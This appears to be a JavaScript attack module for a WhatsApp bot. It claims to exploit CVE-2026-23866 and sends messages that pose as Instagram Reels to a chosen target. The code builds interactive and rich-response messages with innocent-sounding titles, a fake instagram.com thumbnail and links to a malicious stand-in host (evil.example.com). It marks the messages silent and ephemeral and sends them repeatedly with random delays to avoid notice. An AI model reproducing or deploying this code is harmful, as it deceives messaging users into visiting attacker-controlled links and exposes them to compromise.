// lib/rizoinvis.js
// RIZOINVIS — CVE-2026-23866 Instagram Reels rich media exploit
// Silent, invisible, cross-platform
// Drop-in for RIZO-MD

const crypto = require('crypto');
const {
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys');

// ═══════════════════════════════════════════
//  CONFIG
// ═══════════════════════════════════════════
const CONFIG = {
    LOOP_COUNT: 5,
    JITTER_MS: 3000,
    DISGUISE: true,
    SILENT: true,
    INVISIBLE: true,           // message invisible in chat
    REELS_MODE: true,
    RICH_MODE: true,
    FAKE_INSTAGRAM_HOST: 'instagram.com',
    MALICIOUS_URL: 'https://evil.example.com/redirect'
};

// ═══════════════════════════════════════════
//  BENIGN TITLES
// ═══════════════════════════════════════════
const BENIGN_TITLES = [
    'Check this reel out',
    'You have to see this',
    'This is so funny',
    'Look at this video',
    'Thought you would like this',
    'Wait for the end',
    'Watch this',
    'Hilarious reel'
];

function pickTitle() {
    return BENIGN_TITLES[Math.floor(Math.random() * BENIGN_TITLES.length)];
}

function jitter(base) {
    return base + (Math.random() * 2 - 1) * base * 0.5;
}

function randomHost() {
    const prefixes = ['reel', 'reels', 'p', 'tv', 'watch'];
    return prefixes[Math.floor(Math.random() * prefixes.length)];
}

// ═══════════════════════════════════════════
//  REELS PAYLOAD
// ═══════════════════════════════════════════
function buildReelsPayload() {
    const reelId = crypto.randomBytes(11).toString('base64url').slice(0, 11);
    const maliciousUrl = `${CONFIG.MALICIOUS_URL}/${randomHost()}/${reelId}`;

    return {
        title: pickTitle(),
        body: 'Instagram Reels',
        mediaType: 1,
        thumbnailUrl: `https://${CONFIG.FAKE_INSTAGRAM_HOST}/p/${reelId}/thumb.jpg`,
        sourceUrl: maliciousUrl,
        mediaUrl: maliciousUrl,
        renderLargerThumbnail: true,
        showAdAttribution: false,
        reelId,
        maliciousUrl
    };
}

// ═══════════════════════════════════════════
//  VECTOR 1 — INTERACTIVE REELS
// ═══════════════════════════════════════════
async function sendReelsAttack(sock, targetJid) {
    const payload = buildReelsPayload();

    const msg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
        interactiveMessage: {
            body: { text: payload.title },
            footer: { text: '' },
            header: {
                title: '',
                hasMediaAttachment: true,
                externalAdReply: {
                    title: payload.title,
                    body: payload.body,
                    mediaType: payload.mediaType,
                    thumbnailUrl: payload.thumbnailUrl,
                    sourceUrl: payload.sourceUrl,
                    mediaUrl: payload.mediaUrl,
                    renderLargerThumbnail: payload.renderLargerThumbnail,
                    showAdAttribution: payload.showAdAttribution
                }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                silent: CONFIG.SILENT,
                // invisible message flags
                expiration: 1,
                ephemeralSettingTimestamp: Date.now()
            },
            nativeFlowMessage: {
                buttons: []
            }
        }
    }), { userJid: targetJid });

    await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
    return msg.key.id;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — DIRECT RICH RESPONSE
// ═══════════════════════════════════════════
async function sendRichResponse(sock, targetJid) {
    const payload = buildReelsPayload();

    const msg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
        botMessage: {
            message: payload.title,
            richResponse: {
                type: 'INSTAGRAM_REELS',
                url: payload.maliciousUrl,
                metadata: {
                    source: 'instagram',
                    contentId: payload.reelId,
                    previewUrl: payload.maliciousUrl,
                    callbackUrl: payload.maliciousUrl
                }
            }
        }
    }), { userJid: targetJid });

    await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
    return msg.key.id;
}

// ═══════════════════════════════════════════
//  MAIN — RIZOINVIS
// ═══════════════════════════════════════════
async function Rizoinvis(sock, targetJid, onProgress) {
    try {
        let sent = 0;
        const total = CONFIG.LOOP_COUNT * (
            (CONFIG.REELS_MODE ? 1 : 0) + (CONFIG.RICH_MODE ? 1 : 0)
        );

        for (let i = 0; i < CONFIG.LOOP_COUNT; i++) {
            if (CONFIG.REELS_MODE) {
                try {
                    await sendReelsAttack(sock, targetJid);
                    sent++;
                    if (onProgress) onProgress(sent, total, 'reels');
                } catch (err) {
                    console.error('[rizoinvis] reels error:', err.message);
                }
            }

            await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_MS)));

            if (CONFIG.RICH_MODE) {
                try {
                    await sendRichResponse(sock, targetJid);
                    sent++;
                    if (onProgress) onProgress(sent, total, 'rich');
                } catch (err) {
                    console.error('[rizoinvis] rich error:', err.message);
                }
            }

            await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_MS)));
        }

        return { ok: true, sent };
    } catch (err) {
        console.error('[rizoinvis] fatal:', err.message);
        return { ok: false, error: err.message };
    }
}

module.exports = { Rizoinvis, CONFIG };